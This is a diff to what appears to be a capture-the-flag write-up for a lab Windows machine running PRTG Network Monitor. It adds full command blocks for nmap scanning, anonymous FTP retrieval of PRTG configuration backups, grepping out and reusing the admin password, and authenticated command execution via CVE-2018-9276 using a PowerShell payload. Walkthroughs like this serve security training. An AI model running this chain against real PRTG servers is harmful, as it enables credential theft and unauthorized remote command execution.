@@ -118,18 +118,63 @@ Root/admin access came from the machine's core misconfiguration or vulnerability
 
 ## 🧰 Command Palette
 
-<details>
-<summary><b>Useful commands and technique anchors</b></summary>
+<details open>
+<summary><b>🔎 Recon</b></summary>
 
-- `ftp anonymous@<target>`
-- `curl ftp://<target>/Users/Public/user.txt`
-- `download ProgramData/Paessler/PRTG config backups`
-- `grep prtgadmin credentials`
-- `login PRTG with PrTg@dmin2019`
-- `CVE-2018-9276 authenticated command payload`
-- `curl ftp://<target>/Users/Public/root.txt`
+```bash
+sudo nmap -sC -sV -Pn -p- -oN nmap_full.txt 10.129.230.176
+sudo nmap -sC -sV -Pn -p 21,80,135,139,445,5985 -oN nmap_tcp.txt 10.129.230.176
+curl -i http://10.129.230.176/
+```
 
 </details>
+
+<details open>
+<summary><b>📁 Anonymous FTP</b></summary>
+
+```bash
+ftp 10.129.230.176
+# login: anonymous / anonymous
+
+curl -s --user anonymous:anonymous ftp://10.129.230.176/Users/Public/user.txt
+curl -s --user anonymous:anonymous ftp://10.129.230.176/ProgramData/Paessler/PRTG%20Network%20Monitor/PRTG%20Configuration.dat.old.bak -o PRTG.old.bak
+curl -s --user anonymous:anonymous ftp://10.129.230.176/ProgramData/Paessler/PRTG%20Network%20Monitor/PRTG%20Configuration.dat -o PRTG.dat
+```
+
+</details>
+
+<details open>
+<summary><b>🔐 PRTG Credential Recovery</b></summary>
+
+```bash
+grep -i -A5 -B5 'prtgadmin\|password' PRTG*.dat*
+# Historical password found: PrTg@dmin2018
+# Pattern update used:     PrTg@dmin2019
+
+curl -i -c cookies.txt -b cookies.txt \
+  -d 'loginurl=&username=prtgadmin&password=PrTg%40dmin2019' \
+  http://10.129.230.176/public/checklogin.htm
+```
+
+</details>
+
+<details open>
+<summary><b>💥 Authenticated PRTG Command Execution</b></summary>
+
+```bash
+# CVE-2018-9276 style authenticated notification/sensor command abuse
+searchsploit prtg authenticated rce
+searchsploit -m windows/webapps/46527.sh
+
+# Payload objective: copy Administrator root flag to FTP-readable path
+# Example command shape inside PRTG notification/exe sensor:
+powershell -c "Copy-Item -Path 'C:\Users\Administrator\Desktop\root.txt' -Destination 'C:\Users\Public\root.txt'"
+
+curl -s --user anonymous:anonymous ftp://10.129.230.176/Users/Public/root.txt
+```
+
+</details>
+
 
 ---
 
